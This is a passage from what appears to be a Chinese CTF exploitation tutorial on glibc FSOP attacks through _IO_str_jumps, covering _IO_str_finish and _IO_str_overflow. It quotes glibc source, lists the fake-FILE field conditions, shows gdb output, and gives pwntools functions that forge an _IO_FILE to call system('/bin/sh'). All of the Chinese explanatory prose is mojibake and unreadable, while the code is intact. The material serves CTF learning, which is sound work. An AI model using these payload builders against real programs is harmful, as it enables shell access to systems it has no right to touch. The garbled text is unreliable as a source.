_IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_str_pbackfail),<br>  JUMP_INIT(xsputn, _IO_default_xsputn),<br>  JUMP_INIT(xsgetn, _IO_default_xsgetn),<br>  JUMP_INIT(seekoff, _IO_str_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_default_setbuf),<br>  JUMP_INIT(sync, _IO_default_sync),<br>  JUMP_INIT(doallocate, _IO_default_doallocate),<br>  JUMP_INIT(read, _IO_default_read),<br>  JUMP_INIT(write, _IO_default_write),<br>  JUMP_INIT(seek, _IO_default_seek),<br>  JUMP_INIT(close, _IO_default_close),<br>  JUMP_INIT(stat, _IO_default_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="IO-str-finish"><a class="header-anchor" href="#IO-str-finish">Â¶</a>_IO_str_finish</h3><p>è¿™ç©æ„æ¯”è¾ƒç®€å•ï¼Œå…ˆè¯´ä¸€ä¸‹ã€‚</p><p>æˆ‘ä»¬ä»ç„¶éœ€è¦æ„é€ å¥½æ¡ä»¶ï¼Œè¿›å…¥è¢«ä¿®æ”¹åçš„ vtable è¡¨ <code>_IO_OVERFLOW</code> åç§»å¤„çš„å‡½æ•°ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¿™é‡Œçš„ <code>_IO_str_finish</code>ã€‚</p><p>æ‰€ä»¥ 2.23 é‚£é‡Œçš„<strong>æ¡ä»¶è¿˜æ˜¯ä¸èƒ½ä¸¢</strong>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>è¿›å…¥å‡½æ•°åï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_str_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¥½çš„ï¼Œæ¯”è¾ƒæ•æ„Ÿçš„è§‚ä¼—æœ‹å‹ä»¬å·²ç»å‘ç°äº†åç‚¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br></code></pre></td></tr></table></figure><p>è¿™ç©æ„ï¼Œå¸¦äº†å‡½æ•°æŒ‡é’ˆï¼Œå¾ˆå¥½ç”¨ã€‚åªè¦æŠŠè¿™ä¸ª <code>_free_buffer</code> æ‰¬æˆ <code>system</code> ï¼Œ<code>fp-&gt;_IO_buf_base</code> å†™ <code>/bin/sh\0</code> åœ°å€ï¼Œå‰©ä¸‹çš„ <strong>dddd</strong>ã€‚</p><p>è¿™é‡Œ <strong>_s</strong> æ˜¯ä»€ä¹ˆ ğŸ‘´ ç¿»äº†ä¸€å¤§åŠå¤©æºç ä¹Ÿæ²¡å¼„æ˜ç™½è¿™ç©æ„ï¼Œäºæ˜¯å°±æ‘†äº†ã€‚åæ­£ <code>fp-&gt;_s._free_buffer</code> æ˜¯ <strong>fp åŠ ä¸€ä¸ªåç§»</strong>ã€‚å…·ä½“çš„ ğŸ‘´ æœ‰ gdb å¯ä»¥è°ƒã€‚ğŸ‘´ æµ‹å¾—åœ¨ x64 ä¸‹æ˜¯ <strong>0xe8</strong>ã€‚</p><p>å¥½çš„ï¼Œæ€»ç»“ä¸€ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span> <span class="hljs-comment">// 2.23</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base <span class="hljs-comment">// 2.23</span><br>fp-&gt;vtable = _IO_str_jumps_addr<br>fp-&gt;_flags &amp; _IO_USER_BUF = <span class="hljs-number">0</span> <span class="hljs-comment">// æœ€ä½ä½æ²¡æœ‰ 1 </span><br>fp-&gt;_IO_buf_base != <span class="hljs-number">0</span><br>---&gt; fp-&gt;_IO_buf_base = binsh_addr<br>fp-&gt;_s._free_buffer = system_addr <br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF 1 <span class="hljs-comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span><br></code></pre></td></tr></table></figure><h3 id="IO-str-overflow"><a class="header-anchor" href="#IO-str-overflow">Â¶</a>_IO_str_overflow</h3><p>è¿™æ˜¯ä¸ªæ¯”è¾ƒå¤æ‚åŒæ—¶å¾ˆé‡è¦çš„å‡½æ•°ï¼Œåé¢æˆ‘ä»¬ä¹Ÿä¼šç”¨åˆ°è¿™ä¸ªå‡½æ•°ï¼ˆHosue of Pigï¼‰ã€‚</p><p>æˆ‘ä»¬ä»ç„¶éœ€è¦æ„é€ å¥½æ¡ä»¶ï¼Œè¿›å…¥è¢«ä¿®æ”¹åçš„ vtable è¡¨ <code>_IO_OVERFLOW</code> åç§»å¤„çš„å‡½æ•°ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¿™é‡Œçš„ <code>_IO_str_overflow</code>ã€‚</p><p>æ‰€ä»¥ 2.23 é‚£é‡Œçš„<strong>æ¡ä»¶è¿˜æ˜¯ä¸èƒ½ä¸¢</strong>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>è¿›å…¥å‡½æ•°åï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_str_overflow (_IO_FILE *fp, <span class="hljs-type">int</span> c)<br>&#123;<br>  <span class="hljs-type">int</span> flush_only = c == EOF;<br>  _IO_size_t pos;<br>    <br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<br>      <span class="hljs-keyword">return</span> flush_only ? <span class="hljs-number">0</span> : EOF;<br>    <br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;<br>      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;<br>    &#125;<br>    <br>  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;<br>  <span class="hljs-keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="hljs-comment">/* not allowed to enlarge */</span><br><span class="hljs-keyword">return</span> EOF;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-type">char</span> *new_buf;<br>  <span class="hljs-type">char</span> *old_buf = fp-&gt;_IO_buf_base;<br>  <span class="hljs-type">size_t</span> old_blen = _IO_blen (fp);<br>  _IO_size_t new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;<br>  <span class="hljs-keyword">if</span> (new_size &lt; old_blen)<br>    <span class="hljs-keyword">return</span> EOF;<br>  new_buf<br>    = (<span class="hljs-type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<br>  <span class="hljs-keyword">if</span> (new_buf == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/*  __ferror(fp) = 1; */</span><br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (old_buf)<br>    &#123;<br>      <span class="hljs-built_in">memcpy</span> (new_buf, old_buf, old_blen);<br>      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);<br>      <span class="hljs-comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span><br>      fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  <span class="hljs-built_in">memset</span> (new_buf + old_blen, <span class="hljs-string">&#x27;\0&#x27;</span>, new_size - old_blen);<br><br>  _IO_setb (fp, new_buf, new_buf + new_size, <span class="hljs-number">1</span>);<br>  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);<br>  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);<br>  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);<br>  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);<br><br>  fp-&gt;_IO_write_base = new_buf;<br>  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;<br>&#125;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (!flush_only)<br>    *fp-&gt;_IO_write_ptr++ = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) c;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)<br>    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">return</span> c;<br>&#125;<br>libc_hidden_def (_IO_str_overflow)<br></code></pre></td></tr></table></figure><p>ğŸ‘´ çŸ¥é“å¤§ ğŸ”¥ ä¸€çœ¼æœ›å»ç›´æ¥ä¸æƒ³çœ‹äº†ï¼Œä½†æ˜¯æˆ‘ä»¬åªéœ€è¦ç›¯å‡ ä¸ªç‚¹å°±å¥½äº†ã€‚</p><p><strong>é¦–å…ˆæ˜¯æˆ‘ä»¬çš„ç›®æ ‡</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">new_buf = (<span class="hljs-type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<br></code></pre></td></tr></table></figure><p><code>fp-&gt;_s._allocate_buffer</code> å†™ system çš„åœ°å€ï¼Œ<code>new_size</code> æ„é€ æˆ binsh çš„åœ°å€ã€‚</p><p>å…¶ä¸­ <code>fp-&gt;_s._allocate_buffer</code> æ˜¯ fp åŠ ä¸€ä¸ªåç§»ï¼ŒğŸ‘´ æµ‹å¾—åœ¨ x64 ä¸‹æ˜¯ <strong>0xe0</strong>ï¼Œ new_size è®¡ç®—å¦‚ä¸‹ï¼š</p><p>å½“ binsh_addr ä¸º<strong>å¶æ•°</strong>çš„è¯å°±æ˜¯å°å­¦æ•°å­¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-type">size_t</span> old_blen = _IO_blen (fp);<br>  _IO_size_t new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span><br></code></pre></td></tr></table></figure><p>$$<br>2 * old_blen + 100 = binsh_addr\<br>(fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base=\<br>old_blen=(binsh_addr-100)//2<br>$$</p><p>å½“ binsh_addr ä¸º<strong>å¥‡æ•°</strong>ï¼ˆğŸ‘´ æ²¡å’‹é‡è§è¿‡ï¼‰ï¼Œå’±åŠ ä¸€è¯•è¯•çœ‹æ˜Ÿä¸æ˜Ÿï¼Œå®åœ¨ä¸è¡Œå’±ä¸å—è¿™æ°”è‡ªå·±æ‰¾åœ°å€å†™ä¸€ä¸ªå°±  ok ï¼š</p><p><code>0xa = 10</code> æ˜¯å¶æ•°ï¼Œè¿™é‡Œåªæ˜¯å‡è£…æ¼”ç¤ºä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; search /<span class="hljs-built_in">bin</span>/sh<br>libc-<span class="hljs-number">2.27</span>.so    <span class="hljs-number">0x7f463b5cb0fa</span> <span class="hljs-number">0x68732f6e69622f</span> /* <span class="hljs-string">&#x27;/bin/sh&#x27;</span> */<br>pwndbg&gt; x/s <span class="hljs-number">0x7f463b5cb0fa</span>+<span class="hljs-number">1</span><br><span class="hljs-number">0x7f463b5cb0fb</span>: <span class="hljs-string">&quot;bin/sh&quot;</span><br></code></pre></td></tr></table></figure><p><strong>ç„¶åæ˜¯è¾¾æˆç›®æ ‡ï¼Œä½¿è°ƒç”¨æˆ‘ä»¬çš„å‡½æ•°æŒ‡é’ˆï¼Œé¿å… returnï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*[+]----------------1----------------[+]*/</span><br>    <br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<br>      <span class="hljs-keyword">return</span> flush_only ? <span class="hljs-number">0</span> : EOF;<br>    <br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;<br>      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;<br>    &#125;<br><span class="hljs-comment">/*[+]----------------1----------------[+]*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES 8 <span class="hljs-comment">/* Writing not allowd */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="hljs-comment">/* Set if put and get pointer logicly tied. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span><br></code></pre></td></tr></table></figure><p>å³äºŒè¿›åˆ¶è¡¨ç¤ºçš„ <code>_flags</code> å€’æ•°ç¬¬ä¸‰ä½ä¸èƒ½ä¸º1 ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*[+]----------------2----------------[+]*/</span><br>      <br>      <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="hljs-comment">/* not allowed to enlarge */</span><br><span class="hljs-keyword">return</span> EOF;<br>      <br><span class="hljs-comment">/*[+]----------------2----------------[+]*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF 1 <span class="hljs-comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span><br></code></pre></td></tr></table></figure><p>æ„é€ çš„æ—¶å€™å°å¿ƒç‚¹å°±å¥½äº†ï¼Œæ²¡å•¥å¤§é—®é¢˜ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;<br>  <span class="hljs-keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<br>    &#123;<br><span class="hljs-comment">/*[+]----------------3----------------[+]*/</span> <br>          <br>  <span class="hljs-keyword">if</span> (new_size &lt; old_blen)<br>    <span class="hljs-keyword">return</span> EOF;<br>          <br><span class="hljs-comment">/*[+]----------------3----------------[+]*/</span><br></code></pre></td></tr></table></figure><p>1,2 å’‹æ„é€ ï¼ŸğŸ‘´ è¯´ä¿©ä¸ªæ•°ä½ è®°ç€å—·ï¼š <code>0xfbad1800</code>  æˆ– <code>0</code> ç›´æ¥ç»•å®Œï¼Œä¸è¦æèŠ±é‡Œèƒ¡å“¨çš„ã€‚</p><p>è‡³äº 4 ï¼Œè¿™ç©æ„åº”è¯¥æ˜¯é˜²æ­¢ <code>new_size = 2 * old_blen + 100</code> æº¢å‡ºçš„ã€‚ä¸€èˆ¬ä¸ä¼šå‡ºäº‹ã€‚</p><p><strong>æ€»ç»“ä¸€ä¸‹ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><span class="hljs-comment">// 2.23</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<span class="hljs-comment">// 2.23</span><br>fp-&gt;_flags = <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr = <span class="hljs-number">0xffffffffffffffff</span><br>fp-&gt;_s._allocate_buffer = system_addr<br>fp-&gt;_IO_buf_base = <span class="hljs-number">0</span><br>fp-&gt;_IO_buf_end = (binsh_addr<span class="hljs-number">-100</span>)<span class="hljs-comment">//2</span><br></code></pre></td></tr></table></figure><h3 id="åŸºæœ¬æ„é€ -v2"><a class="header-anchor" href="#åŸºæœ¬æ„é€ -v2">Â¶</a>åŸºæœ¬æ„é€ </h3><h4 id="IO-str-finish-v2"><a class="header-anchor" href="#IO-str-finish-v2">Â¶</a>_IO_str_finish</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">binsh,system,IO_str_jumps</span>):<br>fake_IO_FILE  = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(binsh)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><span class="hljs-comment"># _mode &lt;= 0</span><br>fake_IO_FILE += p64(IO_str_jumps-<span class="hljs-number">8</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(system)<br><span class="hljs-keyword">return</span> fake_IO_FILE<br><br>fake_IO = FILE(sh_addr,system_addr,_IO_str_jumps)<br></code></pre></td></tr></table></figure><h4 id="IO-str-overflow-v2"><a class="header-anchor" href="#IO-str-overflow-v2">Â¶</a>_IO_str_overflow</h4><p>å…¶å®ä¸Šé¢é‚£ä¸ªå°±å¤Ÿç”¨äº†ï¼Œä½†é˜²æ­¢æœ‰äººè¯´ ğŸ‘´ æ‡’ ğŸ¶ï¼ŒğŸ‘´ è¿˜æ˜¯æ”¹äº†ä¸ªè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">binsh,system,IO_str_jumps</span>):<br>fake_IO_FILE  = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base; pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64((binsh-<span class="hljs-number">100</span>)//<span class="hljs-number">2</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><span class="hljs-comment"># _mode &lt;= 0</span><br>fake_IO_FILE += p64(IO_str_jumps)<br>fake_IO_FILE += p64(system) <span class="hljs-comment"># 0xe0 _s._allocate_buffer</span><br><span class="hljs-keyword">return</span> fake_IO_FILE<br>fake_IO = FILE(sh_addr,system_addr,_IO_str_jumps)<br></code></pre></td></tr></table></figure><h3 id="å¦‚ä½•å®šä½-IO-str-jumps-ï¼Ÿ"><a class="header-anchor" href="#å¦‚ä½•å®šä½-IO-str-jumps-ï¼Ÿ">Â¶</a>å¦‚ä½•å®šä½ _IO_str_jumps ï¼Ÿ</h3><p>ğŸ‘´ å¯»æ€ ğŸ‘´ æœ‰äº† libc ï¼Œåç§»åˆç›¸å¯¹å›ºå®šï¼Œ ğŸ‘´ æ›´å–œæ¬¢ç›´æ¥å» gdb è°ƒè¯•ç®—ã€‚</p><p>ä¸‹é¢è¿™æ®µæ˜¯ä»åˆ«çš„å¸ˆå‚…é‚£<strong>CV</strong>çš„ï¼Œä¸å–œæ¬¢æŠ˜è…¾çš„å¸ˆå‚…ä»¬å¯ä»¥çœ‹ä¸‹é¢çš„ã€‚</p><p>ç”±äº <code>_IO_str_jumps</code> ä¸æ˜¯å¯¼å‡ºç¬¦å·ï¼Œå› æ­¤æ— æ³•ç›´æ¥åˆ©ç”¨ pwntool sçš„ <code>libc.sym[&quot;_IO_str_jumps&quot;]</code> è¿›è¡Œå®šä½ï¼Œæˆ‘ä»¬å¯ä»¥è½¬æ¢ä¸€ä¸‹æ€è·¯ï¼Œåˆ©ç”¨ <code>_IO_str_jumps</code>ä¸­çš„å¯¼å‡ºå‡½æ•°ï¼Œä¾‹å¦‚ <code>_IO_str_underflow</code> è¿›è¡Œè¾…åŠ©å®šä½ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨gdbå»æŸ¥æ‰¾æ‰€æœ‰åŒ…å«è¿™ä¸ª<code>_IO_str_underflow</code> å‡½æ•°åœ°å€çš„å†…å­˜åœ°å€ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p _IO_str_underflow<br>$<span class="hljs-number">1</span> = &#123;&lt;text variable, no debug info&gt;&#125; <span class="hljs-number">0x7f4d4cf04790</span> &lt;_IO_str_underflow&gt;<br>pwndbg&gt; search -p <span class="hljs-number">0x7f4d4cf04790</span><br>libc.so<span class="hljs-number">.6</span>       <span class="hljs-number">0x7f4d4d2240a0</span> <span class="hljs-number">0x7f4d4cf04790</span><br>libc.so<span class="hljs-number">.6</span>       <span class="hljs-number">0x7f4d4d224160</span> <span class="hljs-number">0x7f4d4cf04790</span><br>libc.so<span class="hljs-number">.6</span>       <span class="hljs-number">0x7f4d4d2245e0</span> <span class="hljs-number">0x7f4d4cf04790</span><br>pwndbg&gt; p &amp;_IO_file_jumps<br>$<span class="hljs-number">2</span> = (&lt;data variable, no debug info&gt; *) <span class="hljs-number">0x7f4d4d224440</span> &lt;_IO_file_jumps&gt;<br></code></pre></td></tr></table></figure><p>å†åˆ©ç”¨ <code>_IO_str_jumps</code> çš„åœ°å€å¤§äº <code>_IO_file_jumps</code> åœ°å€çš„æ¡ä»¶ï¼Œå°±å¯ä»¥é”å®šæœ€åä¸€ä¸ªåœ°å€ä¸ºç¬¦åˆæ¡ä»¶çš„ <code>_IO_str_jumps</code> çš„åœ°å€ï¼Œç”±äº <code>_IO_str_underflow</code> åœ¨<code>_IO_str_jumps</code> çš„åç§»ä¸º0x20ï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—å‡º<code>_IO_str_jumps</code> = 0x7f4d4d2245c0ï¼Œå†å‡æ‰libcçš„åŸºåœ°å€ï¼Œå°±å¯ä»¥å¾—åˆ°<code>_IO_str_jumps</code> çš„æ­£ç¡®åç§»ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥ç”¨IDA <a href="http://xn--Prolibc-nk0l041n.so">Proåˆ†ælibc.so</a>ï¼ŒæŸ¥æ‰¾<code>_IO_file_jumps</code> åçš„jumpè¡¨å³å¯ã€‚ æ­¤å¤–ï¼Œä»‹ç»ä¸€ç§ç›´æ¥åˆ©ç”¨pwntoolså¾—åˆ°<code>_IO_str_jumps</code> åç§»çš„æ–¹æ³•ï¼Œæ€æƒ³ä¸é‡‡ç”¨åŠ¨æ€è°ƒè¯•åˆ†æçš„æ–¹æ³•ç±»ä¼¼ï¼Œç›´æ¥æ”¾ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_IO_str_jumps</span>():<br>   IO_file_jumps_offset = libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>   IO_str_underflow_offset = libc.sym[<span class="hljs-string">&#x27;_IO_str_underflow&#x27;</span>]<br>   <span class="hljs-keyword">for</span> ref_offset <span class="hljs-keyword">in</span> libc.search(p64(IO_str_underflow_offset)):<br>       possible_IO_str_jumps_offset = ref_offset - <span class="hljs-number">0x20</span><br>       <span class="hljs-keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:<br>          <span class="hljs-keyword">return</span> possible_IO_str_jumps_offset<br></code></pre></td></tr></table></figure><h3 id="ä¾‹é¢˜-v2"><a class="header-anchor" 